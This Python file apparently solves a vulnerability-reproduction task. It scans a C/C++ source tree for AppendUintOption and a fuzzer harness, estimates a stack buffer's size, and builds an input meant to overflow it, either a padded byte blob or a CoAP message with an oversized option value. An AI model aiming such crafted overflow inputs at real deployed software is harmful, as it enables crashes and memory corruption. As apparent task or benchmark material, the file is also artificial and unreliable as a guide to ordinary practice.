import os
import re
import tarfile
import tempfile
from typing import Dict, List, Optional, Tuple


def _read_text_file(path: str, max_size: int = 4 * 1024 * 1024) -> Optional[str]:
    try:
        st = os.stat(path)
        if st.st_size > max_size:
            return None
        with open(path, "rb") as f:
            data = f.read()
        return data.decode("utf-8", "ignore")
    except Exception:
        return None


def _gather_sources_from_dir(root: str) -> Dict[str, str]:
    exts = {".c", ".cc", ".cpp", ".cxx", ".h", ".hpp", ".hh", ".inc", ".ipp", ".tpp", ".m", ".mm"}
    out: Dict[str, str] = {}
    for dirpath, _, filenames in os.walk(root):
        for fn in filenames:
            ext = os.path.splitext(fn)[1].lower()
            if ext not in exts:
                continue
            path = os.path.join(dirpath, fn)
            txt = _read_text_file(path)
            if txt is None:
                continue
            rel = os.path.relpath(path, root)
            out[rel] = txt
    return out


def _gather_sources_from_tar(tar_path: str) -> Dict[str, str]:
    exts = {".c", ".cc", ".cpp", ".cxx", ".h", ".hpp", ".hh", ".inc", ".ipp", ".tpp", ".m", ".mm"}
    out: Dict[str, str] = {}
    with tarfile.open(tar_path, "r:*") as tf:
        for m in tf.getmembers():
            if not m.isfile():
                continue
            name = m.name
            ext = os.path.splitext(name)[1].lower()
            if ext not in exts:
                continue
            if m.size > 4 * 1024 * 1024:
                continue
            try:
                f = tf.extractfile(m)
                if f is None:
                    continue
                data = f.read()
                txt = data.decode("utf-8", "ignore")
                out[name] = txt
            except Exception:
                continue
    return out


def _extract_brace_block(text: str, open_brace_idx: int) -> Optional[Tuple[int, int, str]]:
    if open_brace_idx < 0 or open_brace_idx >= len(text) or text[open_brace_idx] != "{":
        return None

    i = open_brace_idx
    depth = 0
    in_sq = False
    in_dq = False
    in_line_comment = False
    in_block_comment = False
    esc = False

    start = open_brace_idx
    while i < len(text):
        ch = text[i]
        nxt = text[i + 1] if i + 1 < len(text) else ""

        if in_line_comment:
            if ch == "\n":
                in_line_comment = False
            i += 1
            continue

        if in_block_comment:
            if ch == "*" and nxt == "/":
                in_block_comment = False
                i += 2
            else:
                i += 1
            continue

        if in_sq:
            if esc:
                esc = False
            elif ch == "\\":
                esc = True
            elif ch == "'":
                in_sq = False
            i += 1
            continue

        if in_dq:
            if esc:
                esc = False
            elif ch == "\\":
                esc = True
            elif ch == '"':
                in_dq = False
            i += 1
            continue

        if ch == "/" and nxt == "/":
            in_line_comment = True
            i += 2
            continue
        if ch == "/" and nxt == "*":
            in_block_comment = True
            i += 2
            continue

        if ch == "'":
            in_sq = True
            i += 1
            continue
        if ch == '"':
            in_dq = True
            i += 1
            continue

        if ch == "{":
            depth += 1
        elif ch == "}":
            depth -= 1
            if depth == 0:
                end = i
                return start, end, text[start : end + 1]
        i += 1

    return None


def _find_function_def(text: str, func_name: str) -> Optional[Tuple[str, str]]:
    # Try to find a real definition: "AppendUintOption(...){"
    # Avoid declarations ending with ';'
    pat = re.compile(r"\b" + re.escape(func_name) + r"\s*\(([^;]*?)\)\s*\{", re.DOTALL)
    m = pat.search(text)
    if not m:
        return None
    sig_params = m.group(1)
    brace_idx = text.find("{", m.end() - 1)
    blk = _extract_brace_block(text, brace_idx)
    if not blk:
        return None
    _, _, body = blk
    return sig_params, body


def _detect_arrays_in_body(body: str) -> Dict[str, int]:
    arrays: Dict[str, int] = {}
    # Basic stack array declarations
    # e.g., uint8_t buf[4]; char tmp[16];
    pat = re.compile(
        r"\b(?:unsigned\s+char|signed\s+char|char|uint8_t|int8_t|uint16_t|int16_t|uint32_t|int32_t|uint64_t|int64_t)\s+([A-Za-z_]\w*)\s*\[\s*(\d+)\s*\]\s*;"
    )
    for m in pat.finditer(body):
        name = m.group(1)
        size = int(m.group(2))
        arrays[name] = size
    return arrays


def _guess_relevant_buffer_size(sig_params: str, body: str) -> int:
    arrays = _detect_arrays_in_body(body)
    if not arrays:
        return 4

    # Prefer arrays used as destination in known unsafe operations
    dangerous_calls = ["memcpy", "memmove", "strcpy", "strncpy", "sprintf", "vsprintf", "gets"]
    candidates: List[int] = []
    for name, sz in arrays.items():
        for fn in dangerous_calls:
            if re.search(r"\b" + re.escape(fn) + r"\s*\(\s*" + re.escape(name) + r"\b", body):
                candidates.append(sz)
                break
        # Also look for direct indexing patterns
        if re.search(r"\b" + re.escape(name) + r"\s*\[\s*\w+\s*\]\s*=", body):
            candidates.append(sz)

    if candidates:
        return max(1, min(candidates))

    # Else pick smallest array declared in function as likely temp buffer
    return max(1, min(arrays.values()))


def _detect_fuzz_mode(sources: Dict[str, str]) -> Tuple[str, Optional[str]]:
    # Returns mode: "provider", "direct_append", "raw_parse", "unknown"
    fuzzer_files: List[Tuple[str, str]] = []
    for path, txt in sources.items():
        if "LLVMFuzzerTestOneInput" in txt:
            fuzzer_files.append((path, txt))

    if not fuzzer_files:
        return "unknown", None

    # Prefer one mentioning AppendUintOption
    fuzzer_files.sort(key=lambda p: ("AppendUintOption" not in p[1], len(p[1])))

    for path, txt in fuzzer_files:
        # Extract fuzzer function body for analysis
        idx = txt.find("LLVMFuzzerTestOneInput")
        if idx < 0:
            continue
        m = re.search(r"LLVMFuzzerTestOneInput\s*\([^)]*\)\s*\{", txt[idx:])
        if not m:
            continue
        brace_idx = txt.find("{", idx + m.end() - 1)
        blk = _extract_brace_block(txt, brace_idx)
        body = blk[2] if blk else txt

        if "AppendUintOption" in body:
            if "FuzzedDataProvider" in body:
                return "provider", path
            return "direct_append", path

        if "FuzzedDataProvider" in body:
            return "provider", path

        # Heuristic for raw parse: any call with (data, size)
        if re.search(r"\(\s*data\s*,\s*size\s*(?:,|\))", body):
            return "raw_parse", path

    return "unknown", fuzzer_files[0][0]


def _encode_coap_option(prev_number: int, number: int, value: bytes) -> bytes:
    delta = number - prev_number
    if delta < 0:
        raise ValueError("Options must be in increasing order")

    def enc_ext(v: int) -> Tuple[int, bytes]:
        if v < 13:
            return v, b""
        if v < 269:
            return 13, bytes([v - 13])
        if v < 65805:
            x = v - 269
            return 14, bytes([(x >> 8) & 0xFF, x & 0xFF])
        # Larger than standard, but cap safely
        # CoAP uses up to 2-byte ext with nibble 14; nibble 15 is reserved.
        x = 65535 - 269
        return 14, bytes([(x >> 8) & 0xFF, x & 0xFF])

    dn, de = enc_ext(delta)
    ln, le = enc_ext(len(value))
    if dn == 15 or ln == 15:
        raise ValueError("Invalid option encoding")
    first = (dn << 4) | ln
    return bytes([first]) + de + le + value


def _craft_coap_message(option_number: int, opt_value_len: int) -> bytes:
    # CoAP header: Ver=1, Type=CON(0), TKL=0, Code=GET(1), MessageID=0
    header = bytes([0x40, 0x01, 0x00, 0x00])
    value = b"A" * opt_value_len
    opt = _encode_coap_option(0, option_number, value)
    return header + opt


def _extract_min_size_checks(fuzzer_text: str) -> int:
    # Look for "if (size < N)" patterns
    mins = []
    for m in re.finditer(r"\bsize\s*<\s*(\d+)", fuzzer_text):
        try:
            mins.append(int(m.group(1)))
        except Exception:
            pass
    return max(mins) if mins else 0


class Solution:
    def solve(self, src_path: str) -> bytes:
        if os.path.isdir(src_path):
            sources = _gather_sources_from_dir(src_path)
        else:
            sources = _gather_sources_from_tar(src_path)

        # Find AppendUintOption implementation to infer buffer size
        sig_params = ""
        append_body = ""
        for _, txt in sources.items():
            found = _find_function_def(txt, "AppendUintOption")
            if found:
                sig_params, append_body = found
                break

        buf_size = 4
        if append_body:
            buf_size = _guess_relevant_buffer_size(sig_params, append_body)
            if buf_size <= 0:
                buf_size = 4

        mode, fuzzer_path = _detect_fuzz_mode(sources)

        if mode in ("provider", "direct_append"):
            min_req = 0
            if fuzzer_path and fuzzer_path in sources:
                min_req = _extract_min_size_checks(sources[fuzzer_path])

            # Keep input small-ish; ensure we have enough bytes to satisfy common size checks
            target_len = max(21, min_req)
            if target_len < 21:
                target_len = 21
            if target_len > 256:
                target_len = 256

            data = bytearray(b"\xFF" * target_len)
            # Make first byte small to avoid huge loop counts in some fuzz targets
            data[0] = 1
            # Sprinkle some zero bytes to prevent some parsers from rejecting everything too early
            if target_len >= 8:
                data[1:4] = b"\x00\x00\x00"
            return bytes(data)

        # Raw-parse fallback: craft a CoAP message with an oversized uint option value length
        # Try common uint option number: Content-Format (12)
        opt_num = 12

        # Try to infer an option number literal from call sites (best-effort)
        # If method-call style is used: ".AppendUintOption(<num>,"
        lit_nums = []
        for txt in sources.values():
            for m in re.finditer(r"\.AppendUintOption\s*\(\s*(\d+)\s*,", txt):
                try:
                    n = int(m.group(1))
                    if 0 <= n <= 2048:
                        lit_nums.append(n)
                except Exception:
                    pass
        if lit_nums:
            opt_num = min(lit_nums)

        overflow_len = buf_size + 1
        if overflow_len < 5:
            overflow_len = 5
        if overflow_len > 512:
            overflow_len = 512

        return _craft_coap_message(opt_num, overflow_len)